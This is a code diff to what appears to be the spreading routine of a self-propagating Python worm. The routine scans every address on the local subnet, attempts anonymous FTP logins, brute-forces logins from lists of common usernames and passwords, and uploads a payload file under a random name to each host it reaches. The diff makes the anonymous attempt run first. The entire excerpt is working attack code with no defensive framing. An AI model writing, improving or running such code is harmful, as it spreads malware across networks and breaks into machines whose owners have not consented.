@@ -217,6 +217,7 @@ def ftp_connect(ip, user, pwd, anonymous=False):
         if payload_path:
             with open(payload_path, 'rb') as f:
                 ftp.storbinary(f'STOR {random_name}', f)
+        else: return False
         ftp.quit()
         return True
     except: return False
@@ -227,22 +228,20 @@ def ftp_spread(common_users, common_pass):
         local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
         for i in range(1, 255):
             ip = f'{local_ip}.{i}'
-            done = False
-            for user in common_users:
-                if done: break
-                for pwd in common_pass:
-                    print(f"Trying for ip: {ip} with user: {user}, pass: {pwd}")
-                    done = ftp_connect(ip, user, pwd)
-                    if done: 
-                        print(f"DONE Sending file for user: {user}, ip: {ip}")
-                        break 
-                    else: print("ERROR NOT SEND")
-            if not done:
-                print(f"Trying for ip: {ip} as anonymous user")
-                if ftp_connect(ip, "", "", anonymous=True):
-                    print(f"DONE Sending file as anonymous user for ip: {ip}")
-                else: print("ERROR NOT SEND")
-                
+            print(f"Trying for ip: {ip} as anonymous user")
+            if ftp_connect(ip, "", "", anonymous=True): print(f"DONE Sending file as anonymous user for ip: {ip}")
+            else: 
+                print("ERROR NOT SEND")
+                done = False
+                for user in common_users:
+                    if done: break
+                    for pwd in common_pass:
+                        print(f"Trying for ip: {ip} with user: {user}, pass: {pwd}")
+                        done = ftp_connect(ip, user, pwd)
+                        if done: 
+                            print(f"DONE Sending file for user: {user}, ip: {ip}")
+                            break 
+                        else: print("ERROR NOT SEND") 
     except:
         pass
 
